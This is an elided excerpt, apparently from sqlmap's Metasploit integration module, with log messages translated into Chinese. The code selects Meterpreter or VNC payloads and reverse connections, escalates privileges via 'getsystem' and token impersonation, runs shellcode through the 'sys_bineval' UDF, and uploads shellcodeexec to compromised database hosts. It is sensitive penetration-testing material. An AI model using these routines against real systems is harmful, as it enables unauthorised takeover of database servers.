...
class Metasploit(object):
    ...
    def _selectPayload(self):
        if Backend.isOs(OS.WINDOWS) and conf.privEsc:
            infoMsg = "强制使用Meterpreter作为Metasploit载荷,因为它是唯一可以通过'incognito'扩展、'getsystem'命令或后置模块提升权限的载荷"
            logger.info(infoMsg)
        ...
        if _payloadStr == "windows/vncinject":
            ...
            if Backend.isDbms(DBMS.MYSQL):
                debugMsg = "默认情况下,Windows上的MySQL运行为SYSTEM用户,VNC注入很可能会成功"
                logger.debug(debugMsg)

            elif Backend.isDbms(DBMS.PGSQL):
                choose = True

                warnMsg = "默认情况下,Windows上的PostgreSQL运行为postgres用户,VNC注入很可能不会成功"
                logger.warning(warnMsg)

            elif Backend.isDbms(DBMS.MSSQL) and Backend.isVersionWithin(("2005", "2008")):
                choose = True

                warnMsg = "VNC注入很可能不会成功,因为通常Microsoft SQL Server %s运行为Network Service用户或管理员未登录" % Backend.getVersion()
                logger.warning(warnMsg)

            if choose:
                message = "您想要做什么？\n"
                message += "[1] 无论如何都尝试\n"
                message += "[2] 回退到Meterpreter载荷(默认)\n"
                message += "[3] 回退到Shell载荷"
                ...
                while True:
                    ...
                    if not choice or choice == "2":
                        ...
                        if Backend.isDbms(DBMS.PGSQL):
                            logger.warning("请注意,VNC注入可能无法正常工作")
                            break
                        ...
                        logger.warning("无效的值,必须为1或2")

        if self.connectionStr.startswith("reverse_http") and _payloadStr != "windows/meterpreter":
            warnMsg = "仅支持Meterpreter载荷的反向HTTP%s连接。回退到反向TCP" % ("S" if self.connectionStr.endswith("s") else "")
            logger.warning(warnMsg)
    ...
    def _selectRhost(self):
        if self.connectionStr.startswith("bind"):
            message = "后端 DBMS 的地址是什么？[按回车键使用默认值 '%s'(检测到的值)] " % self.remoteIP
    ...
    def _selectLhost(self):
        if self.connectionStr.startswith("reverse"):
            message = "本地地址是什么？[按回车键使用默认值 '%s'(检测到的值)] " % self.localIP
    ...
    def _runMsfCliSmbrelay(self):
        ...
        infoMsg = "正在本地运行Metasploit Framework命令行界面,请稍候..."
    ...
    def _runMsfShellcodeRemote(self):
        infoMsg = "正在通过UDF 'sys_bineval'远程运行Metasploit Framework shellcode,请稍候..."
        logger.info(infoMsg)

        self.udfExecCmd("'%s'" % self.shellcodeString, silent=True, udfName="sys_bineval")

    def _runMsfShellcodeRemoteViaSexec(self):
        infoMsg = "正在通过shellcodeexec远程运行Metasploit Framework shellcode,请稍候..."
        logger.info(infoMsg)
    ...
    def _loadMetExtensions(self, proc, metSess):
        ...
        if conf.privEsc:
            ...
            infoMsg = "尝试使用Meterpreter 'getsystem'命令提升权限,该命令尝试使用不同的技术,包括kitrap0d"
            logger.info(infoMsg)

            send_all(proc, "getsystem\n")

            infoMsg = "显示可用的访问令牌列表。如果'getsystem'无法成功提升权限,请使用incognito的'impersonate_token'命令选择要模拟的用户"
            logger.info(infoMsg)
    ...
    def createMsfShellcode(self, exitfunc, format, extra, encode):
        infoMsg = "正在创建Metasploit Framework多阶段shellcode"
        logger.info(infoMsg)
        ...
        dataToStdout("\r[%s] [INFO] 正在创建中 " % time.strftime("%X"))
        pollProcess(process)
        ...
        if match:
            ...
            debugMsg = "shellcode大小为%d字节" % payloadSize
            logger.debug(debugMsg)
        else:
            errMsg = "无法创建shellcode('%s')" % getText(payloadStderr).replace("\n", " ").replace("\r", "")
    ...
    def uploadShellcodeexec(self, web=False):
        ...
        logger.info("将shellcodeexec上传到'%s'" % self.shellcodeexecRemote)
        ...
        if written is not True:
            errMsg = "上传shellcodeexec时出现问题。似乎二进制文件未写入数据库底层文件系统,或者被防病毒软件标记为恶意并删除"
            logger.error(errMsg)
    ...
    def pwn(self, goUdf=False):
        ...
        debugMsg = "Metasploit Framework命令行界面退出,返回代码为 %s" % self._controlMsfCmd(self._msfCliProc, func)
        logger.debug(debugMsg)
    ...
    def smb(self):
        ...
        debugMsg = "Metasploit Framework控制台退出,返回代码为 %s" % self._controlMsfCmd(self._msfCliProc, self.uncPathRequest)
        logger.debug(debugMsg)
    ...
    def bof(self):
        ...
        debugMsg = "Metasploit Framework命令行界面退出,返回代码为 %s" % self._controlMsfCmd(self._msfCliProc, self.spHeapOverflow)
        logger.debug(debugMsg)
